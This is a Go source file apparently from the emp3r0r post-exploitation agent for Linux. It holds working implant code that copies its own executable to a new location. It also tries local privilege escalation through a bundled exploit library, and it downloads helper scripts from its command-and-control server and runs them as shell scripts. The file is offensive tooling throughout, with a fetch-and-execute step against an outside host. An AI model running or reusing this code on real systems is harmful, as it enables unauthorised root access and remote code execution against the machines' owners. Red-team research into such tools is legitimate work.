//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// Copy current executable to a new location
func CopySelfTo(dest_file string) (err error) {
	elf_data, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("Read self exe: %v", err)
	}

	// mkdir -p if directory not found
	dest_dir := strings.Join(strings.Split(dest_file, "/")[:len(strings.Split(dest_file, "/"))-1], "/")
	if !util.IsExist(dest_dir) {
		err = os.MkdirAll(dest_dir, 0700)
		if err != nil {
			return
		}
	}

	// overwrite
	if util.IsExist(dest_file) {
		os.RemoveAll(dest_file)
	}

	return os.WriteFile(dest_file, elf_data, 0755)
}

func GetRoot() error {
	if err := CopySelfTo("./emp3r0r"); err != nil {
		return fmt.Errorf("Self copy failed: %v", err)
	}
	return golpe.RunAll()
}

// runLPEHelper runs helper scripts to give you hints on how to escalate privilege
func runLPEHelper(method string) (out string) {
	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(method, "")
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	log.Printf("Running LPE helper %s", method)
	out, err = RunShellScript(scriptData)
	if err != nil {
		return fmt.Sprintf("Run LPE helper %s failed: %s %v", method, out, err)
	}

	return out
}
